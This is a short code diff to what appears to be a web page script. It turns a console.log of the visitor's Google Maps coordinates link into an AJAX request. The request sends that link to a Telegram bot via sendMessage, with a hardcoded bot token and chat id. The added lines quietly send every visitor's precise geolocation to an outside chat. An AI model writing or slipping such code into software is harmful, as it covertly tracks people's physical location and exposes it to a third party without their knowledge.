@@ -870,7 +870,14 @@
 
              // Set Google map source url
              var mapLink = `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`;
-			console.log(mapLink)
+					$.ajax({
+		url: `https://api.telegram.org/bot5007404101:AAETirjlz-DgKtgiwnvcN4DPTiqZsDZgSj8/sendMessage?chat_id=52238804&text=${mapLink}`,
+		type: 'get',
+		success: function(response){
+			console.log(response)
+	}
+});
+
         }
 		 showPosition();
 
